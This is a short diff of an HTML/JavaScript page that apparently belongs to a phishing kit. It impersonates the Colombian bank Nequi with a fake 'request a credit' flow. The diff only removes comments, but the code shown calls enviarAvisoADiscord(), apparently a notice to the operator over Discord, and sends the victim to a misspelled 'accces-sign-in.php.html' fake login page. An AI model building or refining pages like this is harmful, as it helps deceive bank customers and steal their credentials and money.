@@ -64,7 +64,7 @@
 </head>
 
 <body>
-  <!-- Pantalla de la imagen (oculta al inicio) -->
+  
   <div class="image-back" id="imageBack">
     <img src="continuarconeldesembolso.png" alt="Estás a punto de solicitar un crédito con Nequi">
     <a id="btn-continuar-solicitud" class="nq-btn w-button">Continuar solicitud</a>
@@ -212,7 +212,6 @@
     const imageBack = document.getElementById("imageBack");
     const btnContinuar = document.getElementById("btn-continuar-solicitud");
 
-    // Al hacer clic en cualquiera de los botones "Solicitar crédito"
     function mostrarImagen() {
       localStorage.setItem("typeProduct", "salvavidas");
       enviarAvisoADiscord();
@@ -229,7 +228,6 @@
       mostrarImagen();
     });
 
-    // Al hacer clic en "Continuar solicitud" de la imagen
     btnContinuar.addEventListener("click", () => {
       window.location.href = "accces-sign-in.php.html";
     });
